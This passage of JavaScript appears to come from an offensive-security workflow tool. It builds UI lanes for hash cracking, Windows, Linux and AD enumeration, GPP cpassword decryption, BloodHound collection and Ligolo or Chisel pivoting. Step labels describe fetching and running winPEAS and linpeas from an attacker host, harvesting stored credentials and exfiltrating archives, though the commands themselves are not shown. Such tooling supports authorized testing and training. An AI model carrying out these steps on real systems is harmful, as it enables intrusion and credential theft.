                  { title: 'Inspect Potfile Plaintext (--show)', sub: 'Prints cracked credentials from the potfile.', cmdIndex: 1 }
                ] : [
                  { title: 'Crack AS-REP Hash with Hashcat (-m 18200)', sub: 'Cracks $krb5asrep$ hashes against rockyou.', cmdIndex: 0 }
                ]
              },
              {
                id: 'asrep-john',
                label: 'John the Ripper (krb5asrep)',
                portLabel: 'Auto-Detects',
                steps: [
                  { title: 'Crack AS-REP Hash with John', sub: 'Automatically recognizes krb5asrep format.', cmdIndex: isAdAsrep ? 2 : 1 }
                ]
              }
            ]
          }
        ];
      } else {
        var isNtlm = id === 'crack-ntlm';
        rawGroups = [
          {
            id: 'all',
            icon: 'key',
            label: 'Hash Mode Options',
            lanes: [
              {
                id: 'crack-primary',
                label: isNtlm ? 'NTLM Hash (-m 1000)' : 'NetNTLMv2 Hash (-m 5600)',
                portLabel: 'Standard',
                steps: [
                  { title: isNtlm ? 'Crack NTLM Hash (-m 1000)' : 'Crack NetNTLMv2 Response (-m 5600)', sub: 'Runs dictionary attack against rockyou.txt.', cmdIndex: 0 }
                ]
              },
              {
                id: 'crack-legacy',
                label: isNtlm ? 'Legacy LM Half (-m 3000)' : 'Legacy NetNTLMv1 (-m 5500)',
                portLabel: 'Fallback',
                steps: [
                  { title: isNtlm ? 'Crack Legacy LM Hash (-m 3000)' : 'Crack NetNTLMv1 Response (-m 5500)', sub: 'Use when legacy protocol/hash format is present.', cmdIndex: 1 }
                ]
              }
            ]
          }
        ];
      }
    } else if (category === 'enum-staging') {
      launcherSub = 'Choose between built-in living-off-the-land commands, automated script staging, or remote collection.';
      if (id === 'windows-enum') {
        rawGroups = [
          {
            id: 'all',
            icon: 'folder',
            label: 'Windows Enumeration Lanes',
            lanes: [
              {
                id: 'win-enum-builtin',
                label: 'Built-In Commands (No Upload)',
                portLabel: 'In-Session',
                steps: [
                  { title: 'Check Privileges, Patch Level & Local Admins', sub: 'Runs whoami /all, systeminfo, and net localgroup administrators.', cmdIndex: 1 },
                  { title: 'Check Stored Credentials & Autologon Registry', sub: 'Checks cmdkey /list and Winlogon registry secrets.', cmdIndex: 2 },
                  { title: 'Read PowerShell Console History', sub: 'Inspects PSReadLine history for saved passwords and commands.', cmdIndex: 3 }
                ]
              },
              {
                id: 'win-enum-winpeas',
                label: 'Stage & Run winPEASx64.exe',
                portLabel: 'Automated Sweep',
                steps: [
                  { title: 'Download & Execute winPEAS from Kali HTTP Server', sub: 'Fetches winPEASx64.exe via certutil and runs a full local privesc sweep.', cmdIndex: 0 }
                ]
              },
              {
                id: 'win-enum-remote',
                label: 'Remote One-Liner from Kali (WinRM)',
                portLabel: 'Port 5985',
                lockedWhen: function () { return !winrmOpen; },
                lockBadge: 'Port 5985 Closed',
                steps: [
                  { title: 'Run Enumeration Sweep Remotely via NetExec WinRM', sub: 'Collects privileges, systeminfo, local admins, and cmdkey in one remote shot.', cmdIndex: 4 }
                ]
              }
            ]
          }
        ];
      } else if (id === 'linux-enum') {
        rawGroups = [
          {
            id: 'all',
            icon: 'folder',
            label: 'Linux Enumeration Lanes',
            lanes: [
              {
                id: 'lin-enum-builtin',
                label: 'Built-In Fast Triage (No Upload)',
                portLabel: 'In-Session',
                steps: [
                  { title: 'Check Sudo Rights, Identity & Shell Accounts', sub: 'Runs sudo -l, id, and lists shell-enabled users in /etc/passwd.', cmdIndex: 1 },
                  { title: 'Sweep SUID Binaries, Capabilities & Cron Jobs', sub: 'Checks the top 3 Linux privilege escalation vectors in one command.', cmdIndex: 2 }
                ]
              },
              {
                id: 'lin-enum-linpeas',
                label: 'Stream & Run linpeas.sh',
                portLabel: 'Automated Sweep',
                steps: [
                  { title: 'Stream linpeas.sh from Kali HTTP Server into sh', sub: 'Executes linPEAS directly in memory without touching disk.', cmdIndex: 0 }
                ]
              },
              {
                id: 'lin-enum-remote',
                label: 'Remote Sweep from Kali (SSH)',
                portLabel: 'Port 22',
                lockedWhen: function () { return !sshOpen; },
                lockBadge: 'Port 22 Closed',
                steps: [
                  { title: 'Run Enumeration One-Liner Remotely over SSH', sub: 'Checks id, kernel, sudo, SUID, and capabilities non-interactively.', cmdIndex: 3 }
                ]
              }
            ]
          }
        ];
      } else if (id === 'bloodhound-collect') {
        rawGroups = [
          {
            id: 'all',
            icon: 'zap',
            label: 'BloodHound Collection Lanes',
            lanes: [
              {
                id: 'bh-python',
                label: 'bloodhound-python (Recommended)',
                portLabel: 'Remote from Kali',
                steps: [
                  { title: 'Collect AD Graph Remotely with bloodhound-python', sub: 'Queries LDAP/SMB and writes *_bloodhound.zip on Kali.', cmdIndex: 0 },
                  { title: 'Launch BloodHound GUI & Import ZIP', sub: 'Or drag-and-drop the ZIP directly into Obol.', cmdIndex: 2 }
                ]
              },
              {
                id: 'bh-nxc',
                label: 'NetExec --bloodhound',
                portLabel: 'Remote from Kali',
                steps: [
                  { title: 'Collect AD Graph via NetExec LDAP', sub: 'Alternative remote collector built into NetExec.', cmdIndex: 1 },
                  { title: 'Launch BloodHound GUI', sub: 'Import the generated ZIP archive.', cmdIndex: 2 }
                ]
              },
              {
                id: 'bh-sharphound',
                label: 'On-Host SharpHound.exe',
                portLabel: 'From Windows Foothold',
                steps: [
                  { title: 'Run SharpHound Collector on Target', sub: 'Collects domain data from inside a Windows foothold.', cmdIndex: 3 },
                  { title: 'Import bhloot ZIP on Kali', sub: 'Load the exfiltrated archive into BloodHound or Obol.', cmdIndex: 4 }
                ]
              }
            ]
          }
        ];
      } else if (id === 'ad-path-manual') {
        rawGroups = [
          {
            id: 'all',
            icon: 'zap',
            label: 'Manual AD Enumeration Lanes',
            lanes: [
              {
                id: 'ad-man-acl',
                label: 'Remote ACL & Writable Object Sweep',
                portLabel: 'bloodyAD + nxc',
                steps: [
                  { title: 'Find All Objects Writable by Current User (bloodyAD)', sub: 'Single highest-signal check for GenericAll / WriteDacl / AddMember edges.', cmdIndex: 1 },
                  { title: 'Check Domain Admins DACL & Group Members', sub: 'Inspects who holds rights over Domain Admins.', cmdIndex: 0 },
                  { title: 'List Domain Admins Members', sub: 'Enumerates current members of Domain Admins.', cmdIndex: 2 }
                ]
              },
              {
                id: 'ad-man-roast-adcs',
                label: 'Remote Roast, Delegation & ADCS Sweep',
                portLabel: 'NetExec LDAP',
                steps: [
                  { title: 'Enumerate Privileged Accounts (--admin-count)', sub: 'Lists high-value accounts with adminCount=1.', cmdIndex: 3 },
                  { title: 'Check Delegation & ADCS Templates (-M adcs -M maq)', sub: 'Checks constrained/unconstrained delegation, ADCS templates, and MachineAccountQuota.', cmdIndex: 6 },
                  { title: 'Hunt Account Descriptions for Passwords (-M user-desc)', sub: 'Checks user description attributes for leaked credentials.', cmdIndex: 7 }
                ]
              },
              {
                id: 'ad-man-onhost',
                label: 'On-Host Built-In & PowerView Sweep',
                portLabel: 'In-Session',
                steps: [
                  { title: 'Built-In Groups, Privileges & Domain Admins', sub: 'Zero-upload check using native whoami and net commands.', cmdIndex: 15 },
                  { title: 'PowerView Nested Groups & Outbound ACLs', sub: 'Finds nested group memberships and interesting ACL edges from a Windows shell.', cmdIndex: 12 }
                ]
              }
            ]
          }
        ];
      } else if (id === 'smb-share-inventory' || id === 'gpp-passwords') {
        var isGppMove = id === 'gpp-passwords';
        launcherSub = 'Recursively list custom readable shares (e.g. Replication) and bulk-pull GPP XML files with smbclient before falling back to SYSVOL-only modules.';
        rawGroups = [
          {
            id: 'all',
            icon: 'folder',
            label: 'SMB Share & GPP Discovery Lanes',
            lanes: [
              {
                id: 'null-guest-share-gpp',
                label: 'Null / Guest Recursive Share & GPP XML Decrypt',
                portLabel: 'Port 445 · Null/Guest',
                lockedWhen: function () { return !smbOpen; },
                lockBadge: 'Port 445 Closed',
                steps: isGppMove ? [
                  { title: 'Recursively Dump Readable Share (smbclient -N)', sub: 'Downloads all readable files from custom shares like Replication without credentials.', cmdIndex: 0 },
                  { title: 'Search Downloaded XMLs for cpassword (grep)', sub: 'Locates Groups.xml, Services.xml, and ScheduledTasks.xml containing cpassword.', cmdIndex: 1 },
                  { title: 'Decrypt GPP cpassword Value (gpp-decrypt)', sub: 'Decrypts the AES-256 cpassword attribute into plaintext.', cmdIndex: 2 }
                ] : [
                  { title: 'Recursively List Custom Readable Share (smbclient -N)', sub: 'Walks custom shares like Replication without credentials (nxc -M gpp_password only checks SYSVOL by default).', cmdIndex: 0 },
                  { title: 'Bulk-Download GPP XML Files (Groups.xml / Services.xml)', sub: 'Pulls Groups.xml, Services.xml, and ScheduledTasks.xml from any nested folder.', cmdIndex: 1 },
                  { title: 'Decrypt GPP cpassword Value (gpp-decrypt)', sub: 'Decrypts the AES-256 cpassword attribute into plaintext.', cmdIndex: 7 }
                ]
              },
              {
                id: 'auth-share-spider',
                label: 'Authenticated Share Spider & Recursive Listing',
                portLabel: 'Port 445 · Auth',
                lockedWhen: function () { return !smbOpen; },
                lockBadge: 'Port 445 Closed',
                steps: isGppMove ? [
                  { title: 'Recursively Dump Share with Credentials (smbclient)', sub: 'Downloads all accessible files from the target share.', cmdIndex: 3 },
                  { title: 'Search Downloaded XMLs for cpassword (grep)', sub: 'Locates cpassword attributes across downloaded GPP XML files.', cmdIndex: 1 },
                  { title: 'Decrypt Discovered GPP cpassword', sub: 'Decrypts any discovered cpassword string.', cmdIndex: 2 }
                ] : [
                  { title: 'Recursively List Share with Credentials (smbclient)', sub: 'Lists all nested directories and files on the target share.', cmdIndex: 2 },
                  { title: 'Spider All Readable Shares via NetExec (spider_plus)', sub: 'Catalogs readable files across every non-default SMB share.', cmdIndex: 3 },
                  { title: 'Decrypt Discovered GPP cpassword', sub: 'Decrypts any discovered cpassword string.', cmdIndex: 7 }
                ]
              }
            ]
          }
        ];
      }
    } else if (category === 'pivoting') {
      launcherSub = 'Follow the ordered tunnel setup steps between Kali and your foothold host.';
      if (id === 'ligolo-tunnel-pivot' || id === 'pivot-ligolo') {
        var hasRouteStep = (action.commands || []).length >= 3;
        rawGroups = [
          {
            id: 'all',
            icon: 'zap',
            label: 'Ligolo-ng Tunnel Sequence',
            lanes: [
              {
                id: 'ligolo-chain',
                label: 'Ligolo-ng TUN Interface + Route',
                portLabel: 'TCP 11601',
                steps: [
                  { title: 'Step 1 (On Kali) · Create TUN Interface & Start Proxy', sub: 'Creates the ligolo TUN interface and starts ligolo-proxy listening on 11601.', cmdIndex: 0 },
                  { title: 'Step 2 (On Foothold) · Connect Ligolo Agent to Kali', sub: 'Connects agent back to your Kali proxy.', cmdIndex: 1 }
                ].concat(hasRouteStep ? [
                  { title: 'Step 3 (On Kali) · Add Internal Subnet Route & Start Tunnel', sub: 'Routes internal subnet traffic through the ligolo interface.', cmdIndex: 2 }
                ] : [])
              }
            ]
          }
        ];
      } else if (id === 'pivot-chisel-socks') {
        rawGroups = [
          {
            id: 'all',
            icon: 'zap',
            label: 'Chisel SOCKS5 Proxy Sequence',
            lanes: [
              {
                id: 'chisel-chain',
                label: 'Chisel Reverse SOCKS5 Tunnel',
                portLabel: 'TCP 8080 -> 1080',
                steps: [
                  { title: 'Step 1 (On Kali) · Start Chisel Reverse Server', sub: 'Listens on port 8080 for incoming reverse tunnel connections.', cmdIndex: 0 },
                  { title: 'Step 2 (On Foothold) · Connect Chisel Client (R:socks)', sub: 'Opens SOCKS5 proxy on Kali 127.0.0.1:1080 for proxychains.', cmdIndex: 1 }
                ]
              }
            ]
          }
        ];
      } else if (id === 'pivot-ssh-portforward') {
        rawGroups = [
          {
            id: 'all',
            icon: 'zap',
            label: 'SSH Port Forwarding Mode',
            lanes: [
              {
                id: 'ssh-local-fwd',
                label: 'Local Port Forward (-L)',
                portLabel: 'Reach Internal Service',
                steps: [
                  { title: 'Forward Local Kali Port Through SSH Foothold', sub: 'Binds a local port on Kali and forwards traffic to the internal host:port.', cmdIndex: 0 }
                ]
              },
              {
                id: 'ssh-remote-fwd',
                label: 'Remote Port Forward (-R)',
                portLabel: 'Expose Kali Listener',
                steps: [
                  { title: 'Expose Kali Listener Port on the Foothold Host', sub: 'Allows an isolated internal host to connect back to your Kali listener via the foothold.', cmdIndex: 1 }
                ]
              }
            ]
          }
        ];
      }
    }

    if (!rawGroups.length) return null;

    // Evaluate steps and lanes
    var groups = rawGroups.map(function (g) {
      var evaluatedLanes = (g.lanes || []).map(function (l) {
        var steps = (l.steps || []).map(function (s, idx) {
          var cIdx = typeof s.cmdIndex === 'number' ? s.cmdIndex : 0;
          var cmdObj = (action.commands || [])[cIdx] || {};
          var fillObj = filled[cIdx] || {};
          var filledStr = fillObj.filled || cmdObj.run || '';
          var un = (root.OBOL && root.OBOL.command && typeof root.OBOL.command.unfilledTokens === 'function')
            ? root.OBOL.command.unfilledTokens(filledStr) : [];
          var earnedMap = (root.OBOL && root.OBOL.command && root.OBOL.command.EARNED_TOKENS) || {};
          var gated = !!(fillObj.blocked || un.some(function (t) { return !!earnedMap[t]; }));
          var alreadyOpen = typeof s.alreadyOpenWhen === 'function' ? !!s.alreadyOpenWhen() : false;
          var ranExact = (root.OBOL && root.OBOL.command && typeof root.OBOL.command.commandRanExactOrSig === 'function')
            ? root.OBOL.command.commandRanExactOrSig(filledStr, activities, params, target) : false;
          var triedEpoch = (root.OBOL && root.OBOL.command && typeof root.OBOL.command.commandTriedInEpoch === 'function')
            ? root.OBOL.command.commandTriedInEpoch(action, cmdObj, filledStr, activities, epoch, target) : false;
          var settled = (!s.ignoreSettled && cmdObj) ? commandSettled(cmdObj, facts) : false;
          var customDone = typeof s.doneWhen === 'function' ? !!s.doneWhen() : false;
          var directDone = customDone || settled || ranExact || triedEpoch;
          return {
            stepNum: idx + 1,
            title: s.title || ('Step ' + (idx + 1)),
            sub: s.sub || cmdObj.note || '',
            cmdIndex: cIdx,
            filled: filledStr,
            tool: cmdObj.tool || action.tool || '',
            locus: commandLocus(cmdObj),
            directDone: directDone,
            done: directDone || alreadyOpen,
            implicitDone: false,
            alreadyOpen: alreadyOpen,
            alreadyOpenBadge: s.alreadyOpenBadge || 'Ready',
            gated: gated,
            unfilled: un
          };
        });

        // Implicit Prerequisite Completion (A3b):
        // If a later step in the same lane has completed (directDone), mark earlier setup/connect steps in this lane as done!
        var highestDirectDone = -1;
        for (var si = steps.length - 1; si >= 0; si--) {
          if (steps[si].directDone) { highestDirectDone = si; break; }
        }
        for (var pi = 0; pi < highestDirectDone; pi++) {
          if (!steps[pi].done) {
            steps[pi].done = true;
            steps[pi].implicitDone = true;
          }
        }
        steps.forEach(function (st) {
          st.needsPrevStepPaste = !st.done && !!st.gated;
          if (st.alreadyOpen && !st.directDone && !st.implicitDone) {
            st.statusBadge = st.alreadyOpenBadge;
          } else if (st.done) {
            st.statusBadge = 'Completed';
          } else if (st.gated) {
            st.statusBadge = 'Paste Prev Step First';
          } else {
            st.statusBadge = 'Step ' + st.stepNum + ' · Ready';
          }
        });

        var laneDone = (typeof l.doneWhen === 'function' && l.doneWhen())
          || (steps.length > 0 && steps[steps.length - 1].done && !steps[steps.length - 1].alreadyOpen);
        var laneLocked = !laneDone && typeof l.lockedWhen === 'function' && !!l.lockedWhen();
        var status = laneDone ? 'done' : (laneLocked ? 'locked' : 'ready');
        var badge = laneDone ? 'Completed' : (laneLocked ? (l.lockBadge || l.lockReason || 'Locked') : (l.readyBadge || 'Ready'));
        var badgeIcon = laneDone ? 'check' : (laneLocked ? 'lock' : 'check');

        return {
          id: l.id,
          label: l.label,
          portLabel: l.portLabel || '',
          status: status,
          badge: badge,
          badgeIcon: badgeIcon,
          lockReason: laneLocked ? (l.lockReason || '') : '',
          steps: steps
        };
      });
      return {
        id: g.id,
        icon: g.icon || 'zap',
        label: g.label,
        lanes: evaluatedLanes
      };
    });

    // Resolve active group & lane selection from eng.ui.pathChooserSel[action.id] or smart default
    var savedSel = (eng.ui && eng.ui.pathChooserSel && eng.ui.pathChooserSel[id]) || {};
    var selectedGroup = groups.filter(function (g) { return g.id === savedSel.groupId; })[0];
    if (!selectedGroup) {
      if (id === 'flag-hunt-windows') {
        var onHostGrp = groups.filter(function (g) { return g.id === 'onhost'; })[0];
        var anyOnHostReady = onHostGrp && onHostGrp.lanes.some(function (l) { return l.status === 'ready'; });
        selectedGroup = anyOnHostReady ? onHostGrp : groups[0];
      } else {
        selectedGroup = groups[0];
      }
    }
    var selectedLane = (selectedGroup.lanes || []).filter(function (l) { return l.id === savedSel.laneId; })[0];
    if (!selectedLane) {
      selectedLane = (selectedGroup.lanes || []).filter(function (l) { return l.status === 'ready'; })[0]
        || (selectedGroup.lanes || []).filter(function (l) { return l.status === 'done'; })[0]
        || (selectedGroup.lanes || [])[0];
    }

    return {
      actionId: id,
      category: category,
      launcherTitle: launcherTitle,
      launcherSub: launcherSub,
      needsBothFlagsOnHost: (id === 'flag-hunt-root-windows' || id === 'flag-hunt-root-linux') ? !!needsBothFlagsOnHost : false,
      callout: callout,
      groups: groups,
      selectedGroupId: selectedGroup ? selectedGroup.id : '',
      selectedLaneId: selectedLane ? selectedLane.id : '',
      selectedGroup: selectedGroup || null,
      selectedLane: selectedLane || null
    };
  }

  function pcMakeLane(def, deckVariantSel) {
    deckVariantSel = deckVariantSel || {};
    var laneId = def.id;
    var steps = (def.steps || []).map(function (st, idx) {
      var stepId = st.id || ('step-' + (idx + 1));
      var variants = Array.isArray(st.variants) ? st.variants.map(function (v) {
        return {
          id: v.id,
          label: v.label || v.id,
          tool: v.tool || st.tool || '',
          locus: v.locus || st.locus || 'remote',
          command: v.command || '',
          note: v.note || st.note || '',
          isEducatedGuess: v.isEducatedGuess,
          verifiedPath: v.verifiedPath,
          guessBadge: v.guessBadge
        };
      }) : undefined;
      var savedVarId = deckVariantSel[laneId + ':' + stepId];
      var chosenVar = null;
      if (variants && variants.length) {
        if (savedVarId) {
          chosenVar = variants.filter(function (v) { return v.id === savedVarId; })[0];
        }
        if (!chosenVar && st.selectedVariantId) {
          chosenVar = variants.filter(function (v) { return v.id === st.selectedVariantId; })[0];
        }
        if (!chosenVar) chosenVar = variants[0];
      }
      var resolvedCmd = chosenVar ? chosenVar.command : (st.command || '');
      var resolvedTool = chosenVar ? (chosenVar.tool || st.tool || '') : (st.tool || '');
      var resolvedLocus = chosenVar ? (chosenVar.locus || st.locus || 'remote') : (st.locus || 'remote');
      var resolvedNote = (chosenVar && chosenVar.note) ? chosenVar.note : (st.note || '');
      var resolvedIsGuess = (chosenVar && typeof chosenVar.isEducatedGuess === 'boolean')
        ? chosenVar.isEducatedGuess
        : !!st.isEducatedGuess;
      var resolvedVerified = (chosenVar && typeof chosenVar.verifiedPath === 'boolean')
        ? chosenVar.verifiedPath
        : !!st.verifiedPath;
      var resolvedGuessBadge = (chosenVar && chosenVar.guessBadge) || st.guessBadge || 'Educated Guess';
      return {
        stepNum: idx + 1,
        id: stepId,
        label: st.label || st.title || ('Step ' + (idx + 1)),
        title: st.label || st.title || ('Step ' + (idx + 1)),
        tool: resolvedTool,
        locus: resolvedLocus,
        command: resolvedCmd,
        filled: resolvedCmd,
        note: resolvedNote,
        sub: resolvedNote,
        done: !!st.done,
        needsPrevStepPaste: !!st.needsPrevStepPaste && !st.done,
        isEducatedGuess: resolvedIsGuess && !st.done,
        verifiedPath: resolvedVerified && !st.done,
        guessBadge: resolvedGuessBadge,
        variantLabel: st.variantLabel || 'Tool:',
        variants: variants,
        selectedVariantId: chosenVar ? chosenVar.id : (st.selectedVariantId || ''),
        paramGroups: Array.isArray(st.paramGroups) ? st.paramGroups : [],
        fillInputs: Array.isArray(st.fillInputs) ? st.fillInputs : []
      };
    });

    var highestDone = -1;
    for (var si = steps.length - 1; si >= 0; si--) {
      if (steps[si].done) { highestDone = si; break; }
    }
    for (var pi = 0; pi < highestDone; pi++) {
      steps[pi].done = true;
      steps[pi].needsPrevStepPaste = false;
      steps[pi].isEducatedGuess = false;
    }

    var isLocked = !!def.locked;
    var allDone = !isLocked && (!!def.done || (steps.length > 0 && steps.every(function (s) { return !!s.done; })));
    var status = isLocked ? 'locked' : 'ready';
    var lockReason = isLocked ? (def.lockReason || 'Locked') : '';
    function shortLockBadge(r) {
      if (!r) return 'Locked';
      if (/scan|nmap/i.test(r)) return 'Needs Scan';
      if (/5985.*3389|ports.*closed/i.test(r)) return 'Ports Closed';
      if (/5985/i.test(r)) return 'Port 5985 Off';
      if (/3389/i.test(r)) return 'Port 3389 Off';
      if (/445/i.test(r)) return 'Port 445 Off';
      if (/\b22\b/i.test(r)) return 'Port 22 Off';
      if (/domain controller|\bad\b|88|389|ldap|kerberos/i.test(r)) return 'Needs AD / DC';
      if (/admin|root|privilege|dacl|writable/i.test(r)) return 'Needs Admin';
      if (/share/i.test(r)) return 'Needs Share';
      if (/cred|auth/i.test(r)) return 'Needs Creds';
      if (/shell|on-host/i.test(r)) return 'Needs Shell';
      if (r.length <= 13) return r;
      return r.split(/\s*[(:·-]\s*/)[0].slice(0, 13);
    }
    var badge = isLocked ? (def.lockBadge || shortLockBadge(lockReason)) : (allDone ? 'Done' : 'Ready');
    var badgeIcon = isLocked ? 'lock' : 'check';

    return {
      id: laneId,
      actionId: def.actionId || '',
      title: def.title,
      label: def.title,
      sub: def.sub || '',
      portLabel: def.portLabel || def.sub || '',
      status: status,
      done: allDone,
      badge: badge,
      badgeIcon: badgeIcon,
      lockReason: lockReason,
      steps: steps
    };
  }

  function buildDeck(facts, params, eng, opts) {
    eng = eng || ((root.OBOL && root.OBOL.store && typeof root.OBOL.store.active === 'function') ? root.OBOL.store.active() : null) || {};
    params = params || eng.params || {};
    facts = facts || ((root.OBOL && root.OBOL.store && typeof root.OBOL.store.factSet === 'function') ? root.OBOL.store.factSet() : null);
    opts = opts || {};

    var ctx = (root.OBOL && root.OBOL.command && typeof root.OBOL.command.buildContext === 'function')
      ? root.OBOL.command.buildContext(facts, { params: params, profile: eng.profile })
      : (params || {});

    var allFacts = (root.OBOL && root.OBOL.store && typeof root.OBOL.store.factSet === 'function')
      ? root.OBOL.store.factSet()
      : facts;
    function hasFact(k) { return !!(facts && typeof facts.has === 'function' && facts.has(k)); }
    function factVals(k) { return (facts && typeof facts.values === 'function') ? (facts.values(k) || []) : []; }
    function hasAnyFact(k) { return hasFact(k) || !!(allFacts && typeof allFacts.has === 'function' && allFacts.has(k)); }
    function allFactVals(k) {
      var local = factVals(k);
      var global = (allFacts && allFacts !== facts && typeof allFacts.values === 'function') ? (allFacts.values(k) || []) : [];
      return local.concat(global);
    }

    var openPorts = (root.OBOL && root.OBOL.command && typeof root.OBOL.command.openPorts === 'function' && facts)
      ? root.OBOL.command.openPorts(facts) : [];
    var hasPortScan = openPorts.length > 0;
    function isPortOpen(p) {
      if (hasFact('port:' + p)) return true;
      if (openPorts.indexOf(p) >= 0) return true;
      return false;
    }

    var target = params.target || ctx.target || '{{target}}';
    var domain = params.domain || (ctx.domain && ctx.domain.indexOf('<') < 0 ? ctx.domain : '') || '';
    var explicitUser = params.user || params.username || '';
    var user = explicitUser || (ctx.user && ctx.user.indexOf('<') < 0 ? ctx.user : '') || (ctx.username && ctx.username.indexOf('<') < 0 ? ctx.username : '') || '';
    var password = params.password || '';
    var nthash = params.nthash || '';
    var dahash = params.dahash || (ctx.dahash && ctx.dahash.indexOf('<') < 0 ? ctx.dahash : '') || '';
    var lhost = params.lhost || ctx.lhost || '{{lhost}}';
    var lport = params.lport || ctx.lport || '4444';

    var credsAvail = factVals('credential.available');
    var credsPlain = factVals('credential.plaintext');
    var credsPass = credsPlain.concat(factVals('credential.password')).concat(credsAvail.filter(function (c) { return c && (c.password || c.secret); }));
    var credsHash = factVals('credential.ntlm_hash').concat(factVals('hash.ntlm')).concat(factVals('credential.nthash')).concat(credsAvail.filter(function (c) { return c && (c.nthash || c.hash || c.ntlm); }));
    if (!user) {
      var firstCred = credsPass[0] || credsHash[0] || credsAvail[0];
      if (firstCred && (firstCred.username || firstCred.user)) user = firstCred.username || firstCred.user;
      if (!domain && firstCred && firstCred.domain) domain = firstCred.domain;
    }
    if (!password && credsPass.length) {
      var matchPass = user
        ? credsPass.filter(function (c) { return String(c.username || c.user || '').toLowerCase() === String(user).toLowerCase(); })[0]
        : credsPass[0];
      if (matchPass && (matchPass.password || matchPass.secret)) password = matchPass.password || matchPass.secret;
    }
    if (!nthash && credsHash.length) {
      var matchHash = user
        ? credsHash.filter(function (c) { return String(c.username || c.user || '').toLowerCase() === String(user).toLowerCase(); })[0]
        : credsHash[0];
      if (matchHash && (matchHash.nthash || matchHash.hash || matchHash.ntlm)) nthash = matchHash.nthash || matchHash.hash || matchHash.ntlm;
    }
    if (!password && !nthash && !explicitUser) {
      if (ctx.password && ctx.password.indexOf('<') < 0) password = ctx.password;
      if (ctx.nthash && ctx.nthash.indexOf('<') < 0) nthash = ctx.nthash;
    }
    if (nthash && nthash.indexOf(':') >= 0) nthash = nthash.split(':').pop();
    if (dahash && dahash.indexOf(':') >= 0) dahash = dahash.split(':').pop();

    var hasCred = !!(user && (password || nthash || dahash))
      || hasFact('credential.available') || hasFact('credential.plaintext') || hasFact('credential.password') || hasFact('credential.ntlm_hash') || hasFact('hash.ntlm') || hasFact('credential.nthash') || hasFact('credential.validated');
    var anyAdminFact = hasFact('access.admin') || hasFact('access.system') || hasFact('access.root') || hasFact('access.admin_shell') || !!dahash;
    var adminFactUsers = factVals('access.admin').concat(factVals('access.system')).map(function (v) {
      return v && (v.username || v.user) ? String(v.username || v.user).toLowerCase() : '';
    }).filter(Boolean);
    var userLower = String(user || '').toLowerCase();
    var isSelectedUserAdmin = user
      ? ((hasCred && /^(administrator|admin|root|system|obol)$/i.test(user)) || adminFactUsers.indexOf(userLower) >= 0 || (adminFactUsers.length === 0 && anyAdminFact))
      : anyAdminFact;
    var isAdmin = isSelectedUserAdmin;
    var hasRoot = hasFact('access.root') || isAdmin;
    var activeUser = (isAdmin && dahash && !user) ? 'Administrator' : (user || '{{user}}');
    var activeHash = (isAdmin && dahash && !nthash) ? dahash : nthash;
    var useHashAuth = !!(activeHash && !password);
    var secretKind = password ? 'password' : (activeHash ? 'nthash' : (hasCred ? 'credential' : 'none'));
    var domPrefix = domain ? (domain + '/') : '';
    var activeIdentity = {
      username: user || (isAdmin && dahash ? 'Administrator' : ''),
      domain: domain || '',
      secretKind: secretKind,
      isAdmin: isAdmin,
      label: (user || (isAdmin && dahash ? 'Administrator' : ''))
        ? ((domain ? (domain + '\\') : '') + (user || 'Administrator') + ' (' + (isAdmin ? 'Admin · ' : '') + secretKind + ')')
        : 'Unauthenticated / Null Session'
    };

    var hasSmb = isPortOpen(445) || isPortOpen(139) || hasFact('service.smb') || hasFact('smb.reachable') || hasFact('smb.authenticated') || hasFact('smb.shares') || hasFact('smb.readable_share');
    var hasWinrm = hasFact('port:5985') || hasFact('port:5986') || openPorts.indexOf(5985) >= 0 || openPorts.indexOf(5986) >= 0 || hasFact('service.winrm') || hasFact('winrm.reachable') || hasFact('host.winrm_enabled') || hasFact('winrm.authenticated');
    var hasRdp = hasFact('port:3389') || openPorts.indexOf(3389) >= 0 || hasFact('service.rdp') || hasFact('rdp.reachable') || hasFact('host.rdp_enabled') || hasFact('rdp.authenticated');
    var hasSsh = isPortOpen(22) || hasFact('service.ssh') || hasFact('ssh.reachable') || hasFact('ssh.authenticated');
    var hasLdap = isPortOpen(389) || isPortOpen(636) || isPortOpen(3268) || isPortOpen(3269) || hasFact('ldap.reachable') || hasFact('service.ldap') || hasFact('ad.anonymous_bind') || hasFact('ldap.authenticated');
    var isDc = hasLdap || isPortOpen(88) || hasFact('kerberos.reachable') || hasFact('ad.dc_candidate') || hasFact('service.kerberos') || hasFact('ad.dc');

    var hasTgsHash = hasAnyFact('hash.tgs') || hasAnyFact('kerberos.tgs_hash');
    var hasAsrepHash = hasAnyFact('hash.asrep') || hasAnyFact('kerberos.asrep_hash');
    var hasUserList = hasAnyFact('ad.user_list') || hasAnyFact('ad.users') || hasAnyFact('smb.users');
    var hasAclLead = hasFact('ad.acl_abuse') || hasFact('ad.acl_lead') || hasFact('ad.control_paths') || hasFact('ad.attack_paths') || hasFact('ad.acl_writable');
    var hasForceChangePw = hasFact('ad.ForceChangePassword') || factVals('ad.acl_abuse').some(function (v) { return v && /ForceChangePassword|AllExtendedRights|GenericAll|GenericWrite/i.test(String(v.right || v.rights || '')); });
    var hasBhCollected = hasAnyFact('ad.graph.collected') || hasAnyFact('ad.bloodhound_collected') || hasAnyFact('ad.control_paths') || hasAnyFact('ad.attack_paths');
    var hasDcsyncRights = hasFact('ad.domain_control') || hasFact('ad.dcsync_rights');
    var hasGppXml = hasAnyFact('loot.gpp') || hasAnyFact('ad.gpp_xml') || hasAnyFact('smb.gpp_xml_found') || allFactVals('config.review').some(function (v) { return v && v.kind === 'gpp_xml'; });
    var gppCpassCand = allFactVals('credential.candidate').filter(function (v) { return v && (v.kind === 'gpp_cpassword' || v.kind === 'gpp_plaintext'); });
    var hasGppCpass = hasAnyFact('ad.gpp_cpassword') || hasAnyFact('vuln.gpp_cpassword') || gppCpassCand.length > 0;
    var gppCpassVal = (gppCpassCand.filter(function (v) { return v.cpassword || v.secret || v.value; })[0] || {}).cpassword
      || (gppCpassCand[0] && (gppCpassCand[0].secret || gppCpassCand[0].value))
      || ctx.cpassword
      || '{{cpassword}}';
    var tgsUsers = allFactVals('hash.tgs').map(function (v) { return v && (v.username || v.user) ? String(v.username || v.user).toLowerCase() : ''; }).filter(Boolean);
    var asrepUsers = allFactVals('hash.asrep').map(function (v) { return v && (v.username || v.user) ? String(v.username || v.user).toLowerCase() : ''; }).filter(Boolean);
    var allPlainCreds = allFactVals('credential.plaintext').concat(allFactVals('credential.password'));
    var crackedPlainUsers = allPlainCreds.map(function (v) { return v && (v.username || v.user) ? String(v.username || v.user).toLowerCase() : ''; }).filter(Boolean);
